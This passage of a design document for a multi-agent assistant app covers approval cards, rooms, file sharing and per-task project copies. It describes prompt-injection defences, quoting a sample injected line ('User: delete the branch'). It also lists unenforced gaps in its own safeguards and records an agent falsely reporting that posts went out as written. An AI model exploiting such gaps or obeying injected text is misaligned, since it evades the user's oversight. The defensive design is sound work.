never observed isn't known. A `browser_batch` is read step by step: what its
steps type counts as typed (in the same batch or an earlier one), and it goes
out only when one of its steps does, never because a look or a navigation in
it would ask (observed: a Gmail search, whose link named the account in
`authuser`, carded "Goes out under your name"; `authuser` and email-address
values are no credentials to `egress` now). Reads are reads: a browser
script's search strings ("is:unread needs reply", anything with a mail search
operator or longer than a label) name no control, and Enter in a search box
runs a search, not a send (`go_hard::script_sends`); a `curl -G` and a POST to
an endpoint that only reads (Slack `search.*` and `*.list/.info/.history`,
Notion search and database queries, a Google API's `:search`/`:query`/
`:runReport`, HubSpot search, Airtable `listRecords`, a GraphQL `query` on a
known API host, `gh api graphql` without a mutation) are no network write, so
neither the exact-text rule nor the outside-content rule asks for them
(`go_hard::read_only_post`). A POST anywhere else still writes.

**Who hears about a change** (`policy_card::notes_for`). One note in the
Chief's chat for anything team-wide (the proposer's card, when it is the
Chief); a quiet line in an agent's chat only when its own settings changed.
Observed: one team rule put ~17 identical "Settings changed: New rule…" notes
in every chat in the same minute.

**Presets.** "I trust my agents" (direct, every app, browser, Bold),
**Balanced** (exactly the old behaviour, the default), "Locked down" (read
projects only, no apps, no browser, Careful). "Reset everyone to
…" sets the team and clears every agent's own settings (admin role kept);
"everyone" with one field clears only that field. "Make X like Y" copies Y's
own settings (not its admin role).

**Upgrade, no widening.** The first load writes `access.json` from what the
app did: Balanced team, each "Work directly" and each removed browser as that
agent's own setting.

**Chat first.** `propose_settings_change {agents, changes, why}` (any agent
for itself; admins for others and the team) puts "Change Hiring's settings?"
in the proposer's chat: one group of plain sentences per set of agents
changed the same way. Nothing changes until Allow (`policy_card::answer_card`,
desk or phone); the card keeps the policy's version, so a stale card applies
nothing. Changes that would strand an open copy or the project an agent works
in are refused up front. A turn answering outside text can't propose. Every
agent's prompt carries "What you may do", its rules, and "never tell the user
to go to Settings".

### Settings from chat (`policy_card.rs`, `mcp.rs` `update_agent`)

North star: every setting is changeable from chat. The rule for which ones
ask: **more room for agents, or anything that reaches outside the Mac, is a
card; less applies at once with a quiet line; secrets never go through chat.**
Tests: `agents/settings_chat_tests.rs`.

| Setting (desk) | From chat | Card? |
| --- | --- | --- |
| What it can do: projects, folders, apps, browser, admin, rules, exact-text OK | `propose_settings_change` | yes; lowering independence and turning the exact-text OK on apply at once |
| Independence, per agent or team | `propose_settings_change` `independence` | raising yes, lowering no |
| An app already connected here, per agent ("let Outreach use Linear") | `propose_settings_change` `changes.connections {give, take}` | giving or widening to full yes; taking away or down to read no |
| Fix stopped previews; Keep this Mac awake; Keep running when closed; Open at login | `propose_settings_change` `fix_previews` / `keep_awake` / `keep_running` / `open_at_login`, admins only, on their own | on yes (open at login is a LaunchAgent); off no |
| Usage mode | `set_usage_mode` (Chief) | yes |
| Which account turns start on ("use my personal plan") | `use_account` (Chief): puts that signed-in account first in the order (`wallet::reorder`), failover unchanged | no when the user's own message asked; a card when another agent or a routine did; never for outside text |
| Engine, model, effort, routines' model | `update_agent` (Chief) | no: what its turns run on, not what they may do; one "Now on Opus · High from its next message" line, as the editor leaves |
| Mute an agent's notifications | `update_agent` `muted` (Chief) | no; unread and the badge still count it |
| Name, role, instructions, project, look | `update_agent` / `create_agent` (Chief) | no (a card in a turn answering outside text, as before) |
| Admin switch | `propose_settings_change` `admin` (admins) | yes |
| Logins and secrets | `request_login`, `request_secret` | their own cards; never a value in chat |
| Not from chat | the phone pairing and revoking, Remote Access on/off and its push PIN, adding or removing an account (`wallet`), quick-entry shortcut and menu-bar icon, new agents' default engine/model, the agents' browser switch | each is either a security wall that must be confirmed on the desk (pairing, Remote Access, PIN) or rarely asked for; the desk is the way in |

**An app already connected** (`policy_card::GrantChange`). No sign-in and no
token: the tool finds the one connection for that app (service id or title,
however spelled; `account` when there are several) and the card shows "Can
use Linear (sam@acme.com), read only". Access is read unless `full` is asked
(full still asks on a card before each send or change). A grant the agent's
settings would hide is refused with the `apps.add` to put in the same change.
Team targets are refused: apps are per agent. Allow re-checks each agent's
access is what the card showed (`connections::set_access`), else applies
nothing. An app not connected yet is the agent's own `request_login`.

**This Mac's switches** (`policy_card::MacChange`) are read back from the
thing itself (`commands::remote_access::stay_on_now`) and written by the same
code as Settings (`write_stay_on`, then `sync_stay_on` for the menu bar and
quick entry). Only what differs from now is put on the card.

**What its turns run on** (`mcp::run_settings`): "Opus", "opus", "default"
and "auto" are understood; anything the engine doesn't list is refused with
the list. No card, because a model or effort changes cost, not reach; in
"Save my limits" the Chief already asks before heavy work.

**UI.** Edit agent → "What it can do" (lines with Team default / Its own /
instructions, quick menus, "Change in chat"); Settings → Agents → "What agents
can do" (presets, Reset everyone, ⌘K "What agents can do…"); phone: read-only
"What it can do" (`agents.policy`) with "Change in chat", and the card.

**Residuals (not enforced).** Shell commands still go through the usual card,
and an "Always allow" rule for one (e.g. `npm run build`) can write into a
read-only project; Claude Code reading outside its folders without asking is
not verified here, so read-scope is only as strong as that prompt; on Codex,
reads aren't limited and apps are limited only for connections served here;
take-over ignores the policy (the person at the keyboard answers). Seams: the
Admin work should set/read `policy::is_admin`; Go-hard auto-allow should read
`policy::independence_for`.

## Access

An agent can do what your user account can do: it runs as you, with your files,
logins, CLIs and Claude Code MCP servers. Approvals are the guard, not a
sandbox. That matches the request this was built for ("anything your computer
has access to, so does it"), and it's why the prompts forbid pushing,
deploying, sending or spending unless asked, and why those actions surface as
cards.

## Attachments and quoting (`src-tauri/src/agents/attachments.rs`)

- Paste an image (⌘V), drop files anywhere on the chat, or use the paperclip.
  Staged files sit above the text as removable chips; images show a thumbnail.
- On send each file is copied into `<home>/attachments/<message id>/`, so the
  agent reads its own copy and the chat keeps showing it after the original
  moves. Picked and dropped files are copied by path; a paste is sent as bytes.
- The log keeps what the user typed plus `attachments: [{name, path, mime,
  size}]`; the prompt the agent gets also lists the absolute paths and asks it
  to use the Read tool, which reads images and PDFs natively.
- Limits: 10 files a message, 25 MB a file, refused before sending with a
  message that says which file and why. Folders are refused.
- On the user bubble images render as thumbnails (click: full size, with Open);
  other files as chips that open in their default app
  (`agents_open_attachment`, which only opens paths under `attachments/`).
- Drops come from Tauri's window-global `tauri://drag-*` events, hit-tested
  against the chat (lib/dropTarget). The DOM drag handlers cover the browser
  harness and are inert in the app.
- Select text in an agent's reply and press ⌘L (or the Quote button that
  appears above it) to quote it. Each quote waits above the text as a chip
  (removable; more ⌘L presses add more) and is sent as a Markdown blockquote
  ahead of what you typed. User bubbles show those blockquotes as quote bars
  (`splitQuotes`); nothing else in a user's text is read as Markdown.

## @mentions and What's in flight

- **@mentions.** Typing `@` in the composer opens a small menu of your other
  agents (the app's menu surface; the field keeps focus: ↑ ↓, Return or Tab,
  Esc). Picking one writes `@Name`. `agents_send` takes the mentioned ids,
  keeps only real agents other than the recipient, records them on the
  message as `mentions: [{id, name}]`, and adds one line to the prompt
  (`prompts::mentions`): for the Chief, "delegate this to them with
  message_agent"; for anyone else, "involve them". No new routing: the
  recipient does it with `message_agent`. The bubble tints each recorded
  `@Name` in that agent's colour. A name typed without the menu still counts
  if it matches an agent exactly.
- **What's in flight** (⌘K, id `agents.team`, or the "Needs you · N" row at
  the top of the agent list while anything waits on you) shows,
  in a fixed order and present even when empty: who needs you (with their
  pending approval cards, answerable in place, and turns that didn't finish,
  with Retry or Sign in), who is paused by a usage limit (only when someone
  is, with Retry at the reset), who is working (their
  activity line), the next five active check-ins, and the six latest
  replies. Every row opens that chat; a reply opens it at that line. It
  reads only the store: statuses and check-ins from the registry, cards and
  replies from each chat's recent lines (live for chats open this session,
  otherwise the last 20 lines, re-read when that agent's row changes; a
  chat with an open card reads a page). Hidden agents are left out. While
  it is open no chat is on screen, so replies keep counting as unread. It is
  never restored on reopen: Agents comes back to the last conversation.
  An answered card shows what it resolved to ("Allowed · Lead Gen is
  carrying on") for 1.2s, then folds away, and focus moves to the next
  card's Allow (or the next row). Long field values clamp to two lines with
  "Show all"; cards span the row's text column. The Chief of Staff is created
  pinned (an ordinary pin: unpin it and it sorts by recency).
- **Sidebar order** (`lib/agentsOrder.ts`, `useAttentionOrder`): pinned on
  top, then within each, waiting on you → working → most recent activity.
  It holds still while the list is in use (pointer over it, or scrolled,
  clicked or keyed through in the last 2s): only new agents are added at the
  end and deleted ones dropped. It re-sorts once left alone for 2s, when the
  window comes back to the front, and at once on a pin or unpin; otherwise at
  most once every 4s (`RESORT_MS`), the rows sliding to their places (FLIP).
  The "Needs your OK" row comes and goes at those same moments ("All
  answered" while it waits to go). Every row is one fixed height: the line
  under the name is one line, cut with an ellipsis; a working row's step is
  steadied (`useSteadyLine`, the phone's rule shared in the protocol package:
  1.8s per step, "Thinking" only after 2.5s) and its time sits in a fixed
  column of tabular figures. Other lists
  (switcher, Quick Entry) still use `sortAgents` (pinned, then recency).
- **Sections** (user-made groups in the list) are not built: they need a
  persisted field, a naming flow, collapse state, and a story for how they
  sit with the recency sort. Worth doing as its own slice once the list is
  long enough to want them.
## Rooms (`src-tauri/src/agents/rooms.rs`)

A room is one visible thread shared by you and two to six agents. It is a
conversation, not a merged agent: each member keeps its own session and
memory, and a message in the room becomes a turn in each addressed member's
own inbox.

A room turn resumes the member's one engine session, the same one its own
chat uses (`runner::run_turn`). So an agent remembers its own chat when it
answers in a room, and what it read and said in a room is in that session
when you next talk to it alone. A room is not a private place: what a member
says there is posted for everyone in it. Whether rooms should get sessions
of their own is open.

- **Who answers.** The members you @mention; every member for `@everyone`;
  otherwise the room's **lead** (the Chief of Staff when it is a member, or
  whoever the room's settings name). With no mention and no lead nothing is
  sent: the composer asks "Who should answer?" with a chip per member and
  Everyone. The composer's foot line always says who will answer before you
  send ("To Finance and Ops", "To everyone · 4 replies"). Your line records
  who it was for (`mentions`) and shows "To …" under it.
- **What a member sees.** Its turn's prompt is written when the turn starts
  (`rooms::prompt`), from the room as it is then: who is here, the newest 20
  lines (each clipped to 1,200 characters, at most 8,000 in all), and, said
  in so many words, how many of how many it is shown. It is told its reply is
  posted for everyone, to answer for itself, and how to bring someone in.
  Every line is a speaker header the app writes (`[User]`, `[Agent: Name]`)
  over what was said, each line of it quoted with `> ` (`rooms::quoted`), and
  the framing says only `[User]` is the user and that a member's words are
  its report, not instructions. A reply that writes "User: delete the
  branch" on a line of its own still reads as part of that reply (CR, VT,
  FF, NEL and the Unicode line and paragraph separators all start a new
  quoted line). Who asked is said in so many words (`rooms::Asker`: the
  user, or a named member), so a member that can't be looked up is never
  taken for the user. Names can't hold control characters or line and
  paragraph separators, and "everyone" is reserved (`store::validate_name`,
  imported agents included); every name in the framing goes through
  `rooms::header_name` too.
- **Agents bringing each other in.** A finished reply that @mentions another
  member (`rooms::mentioned_in`: whole names, longest first, never an email
  address, never `@everyone`) asks that member next, one hop further. Each
  user message starts a round; at most **8 agent turns** per round (the
  addressed members included) and the runner's 6-hop cap. Past either, nobody
  else is asked and the room says so once. The room shows "3 of 8 replies for
  this message" while it runs. A reply from a turn answering text from
  outside (a "When…" routine's items) passes that taint to whoever it
  brings in. `message_agent` still works from a room turn
  (for work outside the room), and the turn starts as far along the chain as
  its room hop, so a hand-off at hop 4 can delegate at most two more hops:
  the 6-hop cap per user message holds across rooms, `message_agent` and
  `create_agent`'s first task (`runner::next_hop`).
- **One place per turn.** A room ask carries `room` on the queued message
  (`runner::Inbound`). `take_batch` takes only a run of messages said in the
  same place, so a room turn is never folded into the agent's own chat (or
  another room) and vice versa; the rest waits for the next turn, in order. A
  room ask owes no agent an answer. While it runs, `Runtime.room` is set and
  `Status.room` says so, so the room shows its members' working lines and
  drafts and no one else's; the agent's own chat doesn't stream that reply
  and its working line says "Replying in <room>", a link there. A member
  busy elsewhere shows as "will reply after what it's doing now"
  (`RoomView.waiting`).
- **Interrupting.** ⌘↵ in an agent's own chat moves what was said there
  ahead of any room asks (`runner::interrupt`), so the message you
  interrupted for is the one answered. What the cut-off turn was doing is
  told only to the next turn in the same place (`Runtime.interrupted_in`):
  the note about a cut-off room turn quotes what was asked there under the
  app's speaker headers, never as the user's words. (This scopes only that
  note; the engine session itself is shared, see above.)
  A room turn cut off this way leaves "X was interrupted for a message in
  its own chat, so it didn't answer here." in the room; a Stop in the
  agent's own chat that drops queued room asks leaves "X was stopped before
  answering." in each room, and a room turn that panics leaves "Something
  went wrong running X, so it didn't answer here." there (its error line
  stays in the agent's own chat).
- **Where lines live.** What a room turn records (its reply, cards and change
  cards; its own stop, interruption and error lines through
  `runner::record_in_turn`; never your own lines, another agent's request, a
  check-in, or a note the app records for its own reasons meanwhile, like an
  engine change or a saved secret) is tagged `room` in the member's own log
  and copied into `agents/rooms/<id>/messages.jsonl`. A line from an agent no
  longer in the room isn't copied. A room's page applies each member's card
  answers and timelines from that member's home, so Allow / Deny and
  "Worked … · N steps" work in the room as in the agent's chat; the newest
  change card for a member's open copy offers Keep / Discard there, and a
  result card's **Ask for changes** opens that member's own chat with the
  request staged (a room message can't revise a result). The agent's own
  chat folds its room lines into one line ("2 replies in Pricing launch", a
  link to the room); a card still waiting on you, and the card for its open
  copy, stay in full there too, and so do lines from a room that was
  deleted, which have nowhere else to be read (search finds them there). The room's row, not the agent's, gets the
  preview and the unread count; the agent's row still shows a failure.
- **Accent.** A room is neutral (the monochrome accent); each member's run of
  lines opens with its badge and name in its own colour.
- **The Chief makes rooms** (`agents/room_tools.rs`). `create_room {name,
  members, lead?, purpose}`, `add_to_room {room, agent}` and
  `remove_from_room {room, agent}` are served only to the Chief of Staff and
  refused to anyone else who calls them by name. Each call is checked in full
  first (real agents, two to six, a lead who is in the room, a purpose under
  300 characters folded to one line, no second room with the same name), and
  only then, in a turn answering text from outside (`runner::from_outside`:
  a "When…" routine's items, or a `message_agent` request or room hand-off
  carrying that taint), the user gets a card ("Make a room: Launch", who's in
  it, who answers, what it's for). After Allow the call is checked again, and
  refused if the team or room changed meanwhile. The tools send nothing into
  the room, so the 8-turn and 6-hop caps apply unchanged once people talk
  there. The Chief's chat gets an audit line ("Made a room, Launch, with …");
  adding or removing also leaves a line in the room. The room records
  `purpose` and `createdBy` (both optional and additive: older builds keep
  them untouched, as unknown fields); the desk's empty room shows the purpose
  and "Chief of Staff made this room", and every member's room prompt quotes
  the purpose under an app-written header. The phone gets both fields but
  doesn't show them yet. The Chief is told about the tools in its app-owned
  section (`prompts::CHIEF`, built every turn), so Chiefs made by older
  builds have it without touching their CLAUDE.md.
- **Managing.** "New room" at the foot of the agent list (once there are two
  agents), ⌘K → New room…, Open <room>, <room>: members and name…,
  Mute/Unmute, Delete…. Rooms sit in a "Rooms" section right after the
  agents (above Hidden, as on the phone). A room's badge is its own: its
  initials on an outlined neutral tile, so rooms with the same members still
  look different and none passes for an agent; member faces (three, then
  "+N") are in the room's header and empty state. A quiet room's row is one
  line; its newest words show (one line) while unread or while someone is
  replying or waiting on you there. An unnamed room of four or more is
  "Chief of Staff & 3 others" (`rooms::room_name`). Mute stops the unread count. Deleting a room removes its
  thread and never an agent; deleting an agent takes it out of its rooms
  (and as lead); a room left with fewer than two says so above the composer
  ("Only Finance is left in this room", Delete room / Add members), and with
  none it can't be sent to. "Stop replies here" (`agents_room_stop`) drops only what
  was asked in the room and stops a turn answering there; anything said to
  the agent elsewhere stays queued.
- **Search** scans room threads too; a room hit opens the room. A room line
  is found once, in its room, not again in the member's log.
- **Phone.** Rooms list and room chat (read, send with @mentions and
  @everyone, Who should answer?) for apps that say `hello.features: ["rooms"]`;
  older phones see no rooms, no room-only lines and no room-only search hits;
  a member's line said in a room is a hit in that agent's chat there
  (`wire::search_for_app`, docs/mobile.md).
- **Composer.** As in a 1:1 chat: paperclip, paste and drop for files,
  dictation, and the send button turns into Stop ("Stop replies here")
  while members are replying and nothing is typed. Files are saved into the
  first member's home and copied to every other member's under the same
  `attachments/<message id>/` path, so the room (desk and phone) shows them
  through any member; each asked member is told where they are in its own
  home. A member added later (the room's settings or `add_to_room`) is given
  a copy of every file already in the thread (the user's attachments and
  members' shared files) when it joins (`rooms::copy_files_to`): the same
  `attachments/<message id>/` path in its own home, copied from any home that
  still has it, never through a symlink, and all or nothing: if a copy fails,
  what it copied is removed and the member change is refused, so the room is
  as it was. A file sent while that copy runs is picked up by a second pass.
  Copying was chosen over a read path to a shared folder: each agent keeps
  reading only its own home, and the room keeps showing files through any
  member. Every member's turn in a room lists the files with each line it is
  shown, where they are in its own home. The startup sweep keeps those copies
  (`rooms::any_log_mentions`), since a member's own log never mentions them.
  A member's @mention of another member is tinted in that member's colour
  (whole names, as `rooms::mentioned_in` matches them). Under your message,
  "To everyone" when every member was asked, else "To Finance and Ops". The
  mention menu's @everyone is a group glyph, never initials, and the foot
  line stays empty while the menu is open. A stopped or cut-off member is one
  centred line with its name in its colour, whoever wrote the note.
- **What's in flight** knows rooms: a card or reply said in a room says
  "in <room>" after the agent's name, the card is answered there, and the row
  opens the room. A card waiting in a room is read from the room's thread too.
- **Not built.** Quotes in a room composer; the phone sending files to a room; jumping to a
  search hit's exact line in a room; OS notifications for room replies (cards
  still notify, as the agent's); a user "leave" separate from delete (a room
  with one person in it has nothing to leave; "leave" is an agent leaving,
  via members). A round is per room, not per message: a chain from the
  previous message still running draws on the new one's 8, and rounds live
  in memory (a restart starts them at 0). The desk and the backend match
  @mentions by slightly different rules (the desk wants a space before `@`
  and ASCII word characters after the name). The phone's room view doesn't
  offer Keep / Discard or Ask for changes yet. No real agent turns were run
  in a room for this slice: the routing is unit-tested and the UI is
  harness-tested on fixtures.

## Files back from agents (`src-tauri/src/agents/files.rs`)

- `share_file {path, text?, caption?}` takes `~/…`, an absolute path, or one relative
  to the agent's home. The path is canonicalised and must land inside the
  agent's home or a registered project, so `..` and symlinks are judged by
  where they really lead; folders are refused (zip first). The file is
  **copied** into `<home>/attachments/<message id>/` under the attachments
  limits, so the card survives the agent editing or deleting the original.
- It's recorded as an `agent` message with `attachments` and the caption as
  its text, so unread, notifications ("Shared report.pdf" with no caption) and
  history all treat it like a reply. Images show inline; files are the same
  chips as yours, on the left. Click opens; Show in Finder sits on hover and in
  the image view. The prompt tells agents to share rather than paste.
- **Text with a file** (`agents/share_text.rs`). `text` is the message shown
  above the file, full markdown, as any reply on desk and phone; `caption` is
  a short label put first (`share_text::message_text`). The tool's answer says
  when only a label went out. Why: asked "full text then image, post by post",
  an agent sent six images labelled "1 of 6 · Fri 10am" and said the posts had
  gone out as written, because `caption` was described as one short line. The
  prompt (`FILES`) now says one `share_file` per item with its full text, and
  to re-read what was sent when a request is repeated. A guard backs it: when
  the user's messages ask for text ("text", "copy", "caption", "full",
  "wording", "words") and a finished turn in the agent's own chat shared files
  whose text is all under 40 characters (only the messages carrying files are
  judged: a long wrap-up used to switch it off), the next turn there opens with a quiet note from the app
  (`share_text::LABELS_ONLY_NOTE`). It is in memory only (a restart drops it),
  read once, dropped by Start fresh, and never shown to the user.
- **Files** (header … menu, or ⌘K "Files shared with <agent>") lists every
  attachment in the conversation, both ways, newest first
  (`agents_files`, a scan of the whole log), filterable All / From you /
  From <agent>, each with Open and Show in Finder.
- **Paths in replies** become links: Markdown links without a scheme, `~/…`
  and absolute paths under `/Users`, `/Volumes`, `/tmp` and similar written
  out in prose, and inline code that is only such a path (`/careers` isn't).
  `agents_open_path` resolves relative paths against the agent's home and
  requires the target to exist. Documents open in their default app; folders,
  apps, scripts, anything executable or with a launching extension
  (`.command`, `.app`, `.py`, `.webloc`…) are only revealed in Finder, never
  run. ⌘-click always reveals.

## Result cards (`src-tauri/src/agents/results.rs`)

A finished piece of work comes back as **one** card, not prose plus a pile
of attachments. The agent calls `share_result { title, summary, items[],
checked[], not_verified[], revises?, changes?, project? }` at the end of the
work; the prompt (`prompts::FILES`) tells it to for deliverables, never for
chat.

- **Preview, when it names a project.** `project` is a project's name from
  `project_list`, resolved against the real list (an unknown one shares
  nothing) and stored as its path. The desk's card then offers Preview and
  Test it, which open it in a pane beside the chat only when pressed (see
  "Preview beside the chat"); a revision keeps it. A card riding on
  a change card shows that card's Preview instead. The phone ignores it.

- **Only what exists.** `items` are files (`path`) or links (`url`). A file
  must resolve inside the agent's home or a registered project
  (`files::shareable`, so `..` and symlinks are judged by where they lead)
  and is copied into `attachments/<message id>/`; one bad file shares
  nothing. `.env*` files (examples aside) and private keys (SSH key names,
  `.key`/`.p12`/`.pfx`, any file with a PEM private key block) are refused
  with an honest error (`files::is_secret_file`), here and for `share_file`.
  Links are http/https with no sign-in details in them. `checked`
  and `not_verified` are the agent's own words; the app never fills either,
  and shows each only when given.
- **Refused, never trimmed.** Title 120, summary 2,000, each line 300, 12
  lines per list, 12 items (files also ≤ 10, 25 MB each). Cutting a "not
  verified" list would hide exactly what matters, so too much is an error the
  agent fixes. `role: before|after` is only for pictures.
- **One card per turn, at the end.** The call stages the card
  (`results::stage`; a second call replaces the first and deletes its
  copies). When the turn ends, the runner records it after the reply, so the
  reply ends on it and "What it did" hangs under it. A turn that also changed
  a project puts the card **on its change card** (`results::ride_on`: same
  message, the staged id), so a project copy's card is the result card with
  the copy's row inside it, in the card order: ⋯ · Discard · Preview · Ask
  for changes · Review changes · **Keep changes** (the affirmative last,
  neutral). Without a copy, Ask for changes is the card's only action, a
  text action on the right. A turn cut
  off by quitting loses a staged card (it was never shown); its copied files
  are swept on the next launch (`attachments::sweep_unreferenced`: any
  `attachments/<id>/` the raw log never mentions, older than two minutes).
- **No headless turn, no staging.** A take-over's terminal has the same MCP
  URL minus `?turn=`, and nothing would ever take a staged card there. So when
  the caller has no live turn (`broker::is_live`) the card is recorded into
  the chat at once and the agent is told it is there now
  (`results::recorded_reply`); a second call adds a second card.
- **Ask for changes** opens the composer with a "Changes to <title> · v1"
  chip; the send carries `revises` (the result id). `agents_send` pins the
  message to the result as the log has it (`revises: {id, version, title}`)
  and adds `results::revising_prompt` ahead of the text. The next
  `share_result` revises that result: explicitly (`revises`) or because the
  user's latest message is that ask and no result came after it. Anything
  the user says after an ask is a new request, so it can't capture an
  unrelated result. Retry on a failed ask keeps its `revises`. A revision keeps the id, becomes version
  n+1, and must say what changed (`changes`), shown as "Changes since v1: …".
  The log stays append-only: the older version is still there, folded to
  "<title> · v1 · earlier version" (`newestResults`), and opens on
  click, for reading only, with its change receipt (See changes, the diff)
  when it rode on a change card.
- **Checks are the agent's.** The list is headed "It says it checked"
  (`CHECKED_HEADING`) with plain bullets, never ticks, on desk and phone.
- **Open** that could only show a file in Finder (off the open allowlist)
  says so in a toast.
- **Wire**: `message.result` (`ResultCard`) on an `agent` or `changes`
  message; the files are also on `attachments`, so the Files list, search
  previews and older clients still see them. Types and the pure rules
  (`newestResults`, `beforeAfter`, `changesLine`…) live in
  `packages/companion-protocol/src/results.ts`, shared by desk and phone.
- **Screenshots**: a preview screenshot's result now names where it was kept
  (`attachments/<id>/<name>.jpg`), so the agent can put it on a result as
  `before` / `after` without taking it again.
- Not built: a PR straight from a non-copy result, recordings, and "Open"
  for a result whose project copy has since been kept or discarded (the
  card then reads as a record).

## Agents that work in a project (`src-tauri/src/agents/project.rs`)

An agent can be bound to one project (`Agent.project`, a path from
`list_projects`), from the editor's **Works in** or by the Chief
(`create_agent` / `update_agent` take `project`, a name or path; `"none"`
unbinds). Unbound agents run exactly as before; nothing is migrated.

- **The turn runs in the project** (cwd), so its CLAUDE.md, `.claude/` settings
  and `.mcp.json` load. `--add-dir` gets the agent's home first, then the usual
  folders.
- **The identity comes in the appended system prompt**, with the home's path
  so the agent can keep editing its memory. Verified on Claude Code 2.1.318: a
  CLAUDE.md in an `--add-dir` folder is not loaded; with
  `CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=1` it is, but so is every other
  added folder's (every external project's rules would leak in). `--resume`
  works across a cwd change, so binding keeps the conversation.
- A bound folder that's gone fails the turn with an error naming it.
- The header shows a quiet folder chip that opens the project.

**Change cards.** Before a bound agent's turn the runner snapshots the
project's working tree as a git tree object (through a throwaway copy of the
index, so the user's staging is never touched); after the turn, however it
ended, it snapshots again and diffs the two (`--numstat`, `--name-status`). If
anything changed, a `changes` message records the files with +/- counts, the
branch and both snapshot ids. Edits already present before the turn don't
count; a commit mid-turn doesn't hide work. The card leads with **Open
preview** (opens the project) and **See changes**; the receipt — branch,
line counts, the file list — is one click down. A file opens the app's own
diff modal on this turn's change only (`agents_change_diff`, which reads the
project and snapshots from the stored card). No deploy status: nothing here knows whether that commit deployed.
Limits: another agent or the user editing the same project during the turn is
counted too; the snapshots are unreferenced git objects, so after `git gc`
prunes them the diff says it can't be shown.

### A copy of the project per task (`src-tauri/src/agents/task.rs`)

A bound agent works in its own copy of the project (a git worktree on its own
branch), never in the user's folder, so two agents, or an agent and the user,
can't trample each other. The UI says "a copy of acme-site", "Keep changes",
"Discard"; git stays underneath.

- **When**: a turn of a bound agent with no open copy makes one before it
  starts (the working directory is fixed at spawn, so it can't wait for the
  first edit). The copy (`Agent.copy`) stays open across turns until the user
  keeps or discards it, so follow-ups land in it. A turn that made a copy and
  left it exactly as it started removes it again: questions cost nothing.
  The timeline gets a "Started a copy of acme-site" step.
- **Where**: `<projects root>/.worktrees/<project>/<agent>-<task>-<id>`, the
  folder Ship Studio's own worktrees use (openable by the workspace, listed by
  no dashboard, never inside the project). Branch `<agent>/<task>-<id>` from
  the agent's name and the request's first words. Locked with reason
  `agent-copy:<agent id>`, so `git worktree prune` and a plain remove leave it.
  Ship Studio sees it as an ordinary locked worktree.
- **What comes along**: `.shipstudio/project.json` seeded on its own dev port
  (the seeding `add_worktree` uses), and git-ignored root `.env*`,
  `.claude/settings.local.json` and `node_modules` (up to 3 levels deep).
  Only ignored files are brought in, so none becomes a change Keep would
  commit. `node_modules` is cloned copy-on-write (`cp -c`): measured on a
  317 MB / 31k-entry pnpm tree, 4.7s and no measurable change in free space.
  Where cloning fails nothing is copied and the prompt says dependencies
  aren't installed.
- **Limits**: 4 open copies per project, and none made with under 2 GB free.
  Both fail the turn with a sentence saying what to do; nothing falls back to
  the user's folder.
- **Its own branch, always**: committing, Keep and cleanup first check the
  copy's HEAD is still `refs/heads/<its branch>`. If the agent switched branch
  or detached, they refuse and touch nothing ("The copy isn't on its own branch
  any more — open it to check"); the card shows that line. Even Discard keeps a
  detached copy whose commits no branch holds.
- **Commits**: what a turn leaves uncommitted is committed on the copy's
  branch at the end of the turn (`--no-verify`; bookkeeping, not the user's
  commits), with the `Made-With: <engine>` trailer when attribution is on.
  Never staged: `.shipstudio/` (excluded, and a tracked `project.json` is
  skip-worktree in the copy), `node_modules`, `.env*` (not `.env.example`),
  files over 5 MB, and files whose *added* lines look like a credential (a
  Keychain value, a known token prefix, a private key, `SECRET_NAME=literal`).
  They stay in the copy and the card lists them ("Not included: .env.local
  (looks like secrets)"); a root `.env` the agent edited that git ignores is
  "changed .env — not included". Nothing is committed while conflicts are
  unresolved or a file has added `<<<<<<<` / `>>>>>>>` lines (a bare `=======`
  isn't counted: Markdown underlines).
- **The card**: a turn that changed the copy leaves a `changes` card listing
  everything on the copy's branch (from the base commit's tree: what Keep
  brings), plus `leftOut` and `warning`. Only the newest card of the open copy
  is live: "Changes are ready" (or "Changes so far" while the agent works),
  Keep changes · Review · Preview · Discard, and ⋯ → Open a pull request.
  Keep's tooltip says it adds the agent's commits to `<branch>`.
- **Keep** (`agents_copy_keep`): only into the branch the copy was made from.
  If the project is on another branch now, it answers `otherBranch` and keeps
  nothing; "Keep into <current>" (the note names both branches) sends `into`,
  and only an `into` equal to the current branch keeps there. The project's
  branch is then merged into the copy, so an overlap stops *in the copy*
  (`conflict`); conflict markers stop it too (`markers`), checked before
  committing and again on what the fast-forward would bring. Then the project
  fast-forwards. A project mid-merge / cherry-pick / revert / rebase, unsaved
  edits to the same files, and untracked files in the way each refuse in a
  sentence. `conflict` / `markers` / `otherBranch` are kept on the copy
  (`copy.stuck`) until the next turn or Keep, so the Mac's and the phone's
  cards show them however often they re-render.
- **Discard** (`agents_copy_discard`): asks first; the copy and its branch go.
  Both re-check "is it working?" under the repository lock: a turn claims the
  agent before it prepares its copy, so a Keep can't remove the folder a turn
  is about to start in. Both name the copy, so a stale card can't act on a
  newer one.
- **Preview** opens the copy in the pane beside the chat (Open in workspace
  from there opens it as a workspace project); **Open a pull request**
  opens it and queues the workspace's own Submit for review modal
  (`lib/reviewHandoff.ts`), which only creates the PR when the user submits.
- **Cleanup** (agent deleted, launch sweep): what's pending is committed to the
  copy's branch first; a copy holding anything that can't be committed (a
  secret, an unresolved merge, another branch) is kept. The branch goes only
  when merged. Changing an agent's project while a copy is open is refused
  (`agents_update`, `update_agent`); the editor asks Keep / Discard / Cancel
  first. The workspace's Force Remove of an agent's copy needs a confirmation
  naming the agent (`remove_worktree`'s `confirmAgent`).
- **Lock**: one per repository (its common git dir), so agents bound to a
  repo's main checkout and to one of its worktrees serialise. `git worktree
  add` gets 300s.
- **Opt out**: "Work directly in the project" in the editor (`workDirectly`).
  Unbound agents, non-git folders and repos without a commit run as before.
- **Phone**: `agents.keepCopy` (with `into`) / `agents.discardCopy` (gated by
  `welcome.methods`), as a card under the newest copy card: Discard outlined,
  Keep the neutral answer colour (as Allow), never the agent's. What stopped
  a Keep comes from `copy.stuck`. Preview and pull requests stay on the Mac.
- **Codex**: its sandbox keeps every `.git` read-only, writable roots or not
  (checked with `codex sandbox -P :workspace` on 0.166; adding the project's
  `.git` to `writable_roots` didn't help), so a Codex agent can't commit in its
  copy. It doesn't need to: the turn's end commits, and the prompt says so.
- Not built: a `start_task` tool to begin a fresh copy mid-conversation; the
  sidebar and dashboard still count agent copies as ordinary worktrees; the
  agent's project `session_*` tools still drive the user's own folder.

## Preview beside the chat, and Test it (`src-tauri/src/agents/preview_test.rs`)

**Preview** on a result card with a project, or on a copy card, opens a pane
